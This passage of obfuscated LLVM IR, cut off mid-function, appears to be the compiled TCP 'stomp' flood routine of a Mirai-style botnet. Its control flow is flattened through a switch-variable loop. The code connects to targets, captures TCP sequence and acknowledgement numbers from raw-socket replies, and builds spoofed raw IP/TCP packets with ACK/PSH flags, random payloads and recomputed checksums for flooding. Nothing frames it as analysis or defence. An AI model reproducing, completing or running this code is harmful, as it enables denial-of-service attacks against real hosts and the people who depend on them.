  %154 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 4
  %160 = zext i8 %159 to i32
  %161 = lshr i32 %153, %160
  %162 = add i32 %152, %161
  %163 = call i32 @htonl(i32 %162) #7
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %165 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %164, i32 0, i32 0
  store i32 %163, i32* %165, align 4
  store i32 985113982, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %168 = load i32, i32* %9, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %174 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %173, i32 0, i32 0
  store i32 %172, i32* %174, align 4
  store i32 985113982, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i16, i16* %17, align 2
  %177 = zext i16 %176 to i32
  %178 = icmp eq i32 %177, 65535
  %179 = select i1 %178, i32 -517029735, i32 1162310886
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = call i32 @rand_next()
  %182 = and i32 %181, 65535
  %183 = trunc i32 %182 to i16
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %183, i16* %184, align 2
  store i32 -605655632, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i16, i16* %17, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %187, i16* %188, align 2
  store i32 -605655632, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i32, i32* %26, align 4
  %191 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %192 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %192, %struct.sockaddr** %191, align 8
  %193 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %194 = load %struct.sockaddr*, %struct.sockaddr** %193, align 8
  %195 = call i32 @connect(i32 %190, %struct.sockaddr* %194, i32 16)
  %196 = call i64 @time(i64* null) #6
  store i64 %196, i64* %31, align 8
  store i32 98050240, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  store i32 16, i32* %29, align 4
  %198 = load i32, i32* %10, align 4
  %199 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %200 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %201 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %201, %struct.sockaddr** %200, align 8
  %202 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %203 = load %struct.sockaddr*, %struct.sockaddr** %202, align 8
  %204 = call i64 @recvfrom(i32 %198, i8* %199, i64 256, i32 16384, %struct.sockaddr* %203, i32* %29)
  %205 = trunc i64 %204 to i32
  store i32 %205, i32* %33, align 4
  %206 = load i32, i32* %33, align 4
  %207 = icmp eq i32 %206, -1
  %208 = select i1 %207, i32 -973078971, i32 -2140187308
  store i32 %208, i32* %switchVar
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  store i32 1014103075, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %212 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 4
  %214 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %215 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 4
  %217 = icmp eq i32 %213, %216
  %218 = select i1 %217, i32 -590856150, i32 -915986237
  store i32 %218, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %33, align 4
  %221 = sext i32 %220 to i64
  %222 = icmp ugt i64 %221, 40
  %223 = select i1 %222, i32 1424193968, i32 -915986237
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %226 = getelementptr inbounds i8, i8* %225, i64 20
  %227 = bitcast i8* %226 to %struct.tcphdr*
  store %struct.tcphdr* %227, %struct.tcphdr** %35, align 8
  %228 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 0
  %230 = load i16, i16* %229, align 4
  %231 = zext i16 %230 to i32
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %233 = load i16, i16* %232, align 2
  %234 = zext i16 %233 to i32
  %235 = icmp eq i32 %231, %234
  %236 = select i1 %235, i32 -559410922, i32 -1815634802
  store i32 %236, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 4
  %240 = load i16, i16* %239, align 4
  %241 = lshr i16 %240, 9
  %242 = and i16 %241, 1
  %243 = zext i16 %242 to i32
  %244 = icmp ne i32 %243, 0
  %245 = select i1 %244, i32 2009869744, i32 -2051751231
  store i32 %245, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 4
  %249 = load i16, i16* %248, align 4
  %250 = lshr i16 %249, 12
  %251 = and i16 %250, 1
  %252 = zext i16 %251 to i32
  %253 = icmp ne i32 %252, 0
  %254 = select i1 %253, i32 -1946230961, i32 -2051751231
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %257 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %256, i32 0, i32 0
  %258 = load i32, i32* %257, align 4
  %259 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %260 = load i32, i32* %9, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %259, i64 %261
  %263 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %262, i32 0, i32 0
  store i32 %258, i32* %263, align 4
  %264 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 2
  %266 = load i32, i32* %265, align 4
  %267 = call i32 @ntohl(i32 %266) #7
  %268 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %268, i64 %270
  %272 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %271, i32 0, i32 1
  store i32 %267, i32* %272, align 4
  %273 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %274 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %273, i32 0, i32 3
  %275 = load i32, i32* %274, align 4
  %276 = call i32 @ntohl(i32 %275) #7
  %277 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %278 = load i32, i32* %9, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %277, i64 %279
  %281 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %280, i32 0, i32 2
  store i32 %276, i32* %281, align 4
  %282 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 1
  %284 = load i16, i16* %283, align 2
  %285 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %288, i32 0, i32 3
  store i16 %284, i16* %289, align 4
  %290 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %291 = load i16, i16* %290, align 2
  %292 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %295, i32 0, i32 4
  store i16 %291, i16* %296, align 2
  %297 = load i32, i32* %24, align 4
  %298 = sext i32 %297 to i64
  %299 = add i64 40, %298
  %300 = call noalias i8* @malloc(i64 %299) #6
  %301 = load i8**, i8*** %12, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  store i8* %300, i8** %304, align 8
  %305 = load i8**, i8*** %12, align 8
  %306 = load i32, i32* %9, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds i8*, i8** %305, i64 %307
  %309 = load i8*, i8** %308, align 8
  %310 = bitcast i8* %309 to %struct.iphdr*
  store %struct.iphdr* %310, %struct.iphdr** %36, align 8
  %311 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i64 1
  %313 = bitcast %struct.iphdr* %312 to %struct.tcphdr*
  store %struct.tcphdr* %313, %struct.tcphdr** %37, align 8
  %314 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i64 1
  %316 = bitcast %struct.tcphdr* %315 to i8*
  store i8* %316, i8** %38, align 8
  %317 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %318 = bitcast %struct.iphdr* %317 to i8*
  %319 = load i8, i8* %318, align 4
  %320 = and i8 %319, 15
  %321 = or i8 %320, 64
  store i8 %321, i8* %318, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %323 = bitcast %struct.iphdr* %322 to i8*
  %324 = load i8, i8* %323, align 4
  %325 = and i8 %324, -16
  %326 = or i8 %325, 5
  store i8 %326, i8* %323, align 4
  %327 = load i8, i8* %13, align 1
  %328 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 1
  store i8 %327, i8* %329, align 1
  %330 = load i32, i32* %24, align 4
  %331 = sext i32 %330 to i64
  %332 = add i64 40, %331
  %333 = trunc i64 %332 to i16
  %334 = call zeroext i16 @htons(i16 zeroext %333) #7
  %335 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 2
  store i16 %334, i16* %336, align 2
  %337 = load i16, i16* %14, align 2
  %338 = call zeroext i16 @htons(i16 zeroext %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  store i16 %338, i16* %340, align 4
  %341 = load i8, i8* %15, align 1
  %342 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 5
  store i8 %341, i8* %343, align 4
  %344 = load i8, i8* %16, align 1
  %345 = icmp ne i8 %344, 0
  %346 = select i1 %345, i32 -1291775632, i32 650023560
  store i32 %346, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %349 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i32 0, i32 4
  store i16 %348, i16* %350, align 2
  store i32 650023560, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i32 0, i32 6
  store i8 6, i8* %353, align 1
  %354 = load i32, i32* @LOCAL_ADDR, align 4
  %355 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 8
  store i32 %354, i32* %356, align 4
  %357 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %358 = load i32, i32* %9, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %357, i64 %359
  %361 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i32 0, i32 0
  %362 = load i32, i32* %361, align 4
  %363 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 9
  store i32 %362, i32* %364, align 4
  %365 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %366 = load i32, i32* %9, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i32 0, i32 3
  %370 = load i16, i16* %369, align 4
  %371 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %372 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %371, i32 0, i32 0
  store i16 %370, i16* %372, align 4
  %373 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %374 = load i32, i32* %9, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i32 0, i32 4
  %378 = load i16, i16* %377, align 2
  %379 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 1
  store i16 %378, i16* %380, align 2
  %381 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %382 = load i32, i32* %9, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %384, i32 0, i32 2
  %386 = load i32, i32* %385, align 4
  %387 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %388 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %387, i32 0, i32 2
  store i32 %386, i32* %388, align 4
  %389 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %390 = load i32, i32* %9, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %389, i64 %391
  %393 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %392, i32 0, i32 1
  %394 = load i32, i32* %393, align 4
  %395 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 3
  store i32 %394, i32* %396, align 4
  %397 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %398 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %397, i32 0, i32 4
  %399 = load i16, i16* %398, align 4
  %400 = and i16 %399, -241
  %401 = or i16 %400, 128
  store i16 %401, i16* %398, align 4
  %402 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 4
  %404 = load i16, i16* %403, align 4
  %405 = and i16 %404, -257
  %406 = or i16 %405, 256
  store i16 %406, i16* %403, align 4
  %407 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %408 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %407, i32 0, i32 4
  %409 = load i16, i16* %408, align 4
  %410 = and i16 %409, -4097
  %411 = or i16 %410, 4096
  store i16 %411, i16* %408, align 4
  %412 = call i32 @rand_next()
  %413 = and i32 %412, 65535
  %414 = trunc i32 %413 to i16
  %415 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 5
  store i16 %414, i16* %416, align 2
  %417 = load i8, i8* %18, align 1
  %418 = sext i8 %417 to i16
  %419 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 4
  %421 = load i16, i16* %420, align 4
  %422 = and i16 %418, 1
  %423 = shl i16 %422, 13
  %424 = and i16 %421, -8193
  %425 = or i16 %424, %423
  store i16 %425, i16* %420, align 4
  %426 = load i8, i8* %19, align 1
  %427 = sext i8 %426 to i16
  %428 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 4
  %430 = load i16, i16* %429, align 4
  %431 = and i16 %427, 1
  %432 = shl i16 %431, 12
  %433 = and i16 %430, -4097
  %434 = or i16 %433, %432
  store i16 %434, i16* %429, align 4
  %435 = load i8, i8* %20, align 1
  %436 = sext i8 %435 to i16
  %437 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %438 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %437, i32 0, i32 4
  %439 = load i16, i16* %438, align 4
  %440 = and i16 %436, 1
  %441 = shl i16 %440, 11
  %442 = and i16 %439, -2049
  %443 = or i16 %442, %441
  store i16 %443, i16* %438, align 4
  %444 = load i8, i8* %21, align 1
  %445 = sext i8 %444 to i16
  %446 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 4
  %448 = load i16, i16* %447, align 4
  %449 = and i16 %445, 1
  %450 = shl i16 %449, 10
  %451 = and i16 %448, -1025
  %452 = or i16 %451, %450
  store i16 %452, i16* %447, align 4
  %453 = load i8, i8* %22, align 1
  %454 = sext i8 %453 to i16
  %455 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 4
  %457 = load i16, i16* %456, align 4
  %458 = and i16 %454, 1
  %459 = shl i16 %458, 9
  %460 = and i16 %457, -513
  %461 = or i16 %460, %459
  store i16 %461, i16* %456, align 4
  %462 = load i8, i8* %23, align 1
  %463 = sext i8 %462 to i16
  %464 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %465 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %464, i32 0, i32 4
  %466 = load i16, i16* %465, align 4
  %467 = and i16 %463, 1
  %468 = shl i16 %467, 8
  %469 = and i16 %466, -257
  %470 = or i16 %469, %468
  store i16 %470, i16* %465, align 4
  %471 = load i8*, i8** %38, align 8
  %472 = load i32, i32* %24, align 4
  call void @rand_str(i8* %471, i32 %472)
  store i32 989973610, i32* %switchVar
  br label %loopEnd

; <label>:473:                                    ; preds = %loopEntry
  %474 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %475 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %474, i32 0, i32 4
  %476 = load i16, i16* %475, align 4
  %477 = lshr i16 %476, 8
  %478 = and i16 %477, 1
  %479 = zext i16 %478 to i32
  %480 = icmp ne i32 %479, 0
  %481 = select i1 %480, i32 -1195492709, i32 497890448
  store i32 %481, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %484 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %483, i32 0, i32 4
  %485 = load i16, i16* %484, align 4
  %486 = lshr i16 %485, 10
  %487 = and i16 %486, 1
  %488 = zext i16 %487 to i32
  %489 = icmp ne i32 %488, 0
  %490 = select i1 %489, i32 -1195492709, i32 1869769376
  store i32 %490, i32* %switchVar
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  %492 = load i32, i32* %26, align 4
  %493 = call i32 @close(i32 %492)
  store i32 -1310983294, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  store i32 1594842740, i32* %switchVar
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  store i32 -1815634802, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  store i32 -915986237, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = call i64 @time(i64* null) #6
  %499 = load i64, i64* %31, align 8
  %500 = sub nsw i64 %498, %499
  %501 = icmp sgt i64 %500, 10
  %502 = select i1 %501, i32 -2020661070, i32 -573224182
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load i32, i32* %26, align 4
  %505 = call i32 @close(i32 %504)
  store i32 -1310983294, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  store i32 98050240, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  store i32 1977427059, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  %509 = load i32, i32* %9, align 4
  %510 = add nsw i32 %509, 1
  store i32 %510, i32* %9, align 4
  store i32 -1434516422, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  store i32 73241473, i32* %switchVar
  br label %loopEnd

; <label>:512:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1573652483, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = load i32, i32* %9, align 4
  %515 = load i8, i8* %5, align 1
  %516 = zext i8 %515 to i32
  %517 = icmp slt i32 %514, %516
  %518 = select i1 %517, i32 1526958672, i32 1100891894
  store i32 %518, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  %520 = load i8**, i8*** %12, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds i8*, i8** %520, i64 %522
  %524 = load i8*, i8** %523, align 8
  store i8* %524, i8** %39, align 8
  %525 = load i8*, i8** %39, align 8
  %526 = bitcast i8* %525 to %struct.iphdr*
  store %struct.iphdr* %526, %struct.iphdr** %40, align 8
  %527 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %528 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %527, i64 1
  %529 = bitcast %struct.iphdr* %528 to %struct.tcphdr*
  store %struct.tcphdr* %529, %struct.tcphdr** %41, align 8
  %530 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i64 1
  %532 = bitcast %struct.tcphdr* %531 to i8*
  store i8* %532, i8** %42, align 8
  %533 = load i16, i16* %14, align 2
  %534 = zext i16 %533 to i32
  %535 = icmp eq i32 %534, 65535
  %536 = select i1 %535, i32 1450319552, i32 -1287090787
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  %538 = call i32 @rand_next()
  %539 = and i32 %538, 65535
  %540 = trunc i32 %539 to i16
  %541 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %542 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %541, i32 0, i32 3
  store i16 %540, i16* %542, align 4
  store i32 -1287090787, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load i8, i8* %25, align 1
  %545 = icmp ne i8 %544, 0
  %546 = select i1 %545, i32 1933945050, i32 -963423579
  store i32 %546, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = load i8*, i8** %42, align 8
  %549 = load i32, i32* %24, align 4
  call void @rand_str(i8* %548, i32 %549)
  store i32 -963423579, i32* %switchVar
  br label %loopEnd

; <label>:550:                                    ; preds = %loopEntry
  %551 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 7
  store i16 0, i16* %552, align 2
  %553 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %554 = bitcast %struct.iphdr* %553 to i16*
  %555 = call zeroext i16 @checksum_generic(i16* %554, i32 20)
  %556 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %557 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %556, i32 0, i32 7
  store i16 %555, i16* %557, align 2
  %558 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %559 = load i32, i32* %9, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %558, i64 %560
  %562 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %561, i32 0, i32 1
  %563 = load i32, i32* %562, align 4
  %564 = add i32 %563, 1
  store i32 %564, i32* %562, align 4
  %565 = trunc i32 %563 to i16
  %566 = call zeroext i16 @htons(i16 zeroext %565) #7
  %567 = zext i16 %566 to i32
  %568 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %569 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %568, i32 0, i32 2
  store i32 %567, i32* %569, align 4
  %570 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %571 = load i32, i32* %9, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %570, i64 %572
  %574 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %573, i32 0, i32 2
  %575 = load i32, i32* %574, align 4
  %576 = trunc i32 %575 to i16
  %577 = call zeroext i16 @htons(i16 zeroext %576) #7
  %578 = zext i16 %577 to i32
  %579 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 3
  store i32 %578, i32* %580, align 4
  %581 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %582 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %581, i32 0, i32 6
  store i16 0, i16* %582, align 4
  %583 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %584 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %585 = bitcast %struct.tcphdr* %584 to i8*
  %586 = load i32, i32* %24, align 4
  %587 = sext i32 %586 to i64
  %588 = add i64 20, %587
  %589 = trunc i64 %588 to i16
  %590 = call zeroext i16 @htons(i16 zeroext %589) #7
  %591 = load i32, i32* %24, align 4
  %592 = sext i32 %591 to i64
  %593 = add i64 20, %592
  %594 = trunc i64 %593 to i32
  %595 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %583, i8* %585, i16 zeroext %590, i32 %594)
  %596 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %597 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %596, i32 0, i32 6
  store i16 %595, i16* %597, align 4
  %598 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 1
  %600 = load i16, i16* %599, align 2
  %601 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %602 = load i32, i32* %9, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %601, i64 %603
  %605 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %604, i32 0, i32 0
  %606 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %605, i32 0, i32 1
  store i16 %600, i16* %606, align 2
  %607 = load i32, i32* %10, align 4
  %608 = load i8*, i8** %39, align 8
  %609 = load i32, i32* %24, align 4
  %610 = sext i32 %609 to i64
  %611 = add i64 40, %610
  %612 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %613 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %614 = load i32, i32* %9, align 4
  %615 = sext i32 %614 to i64
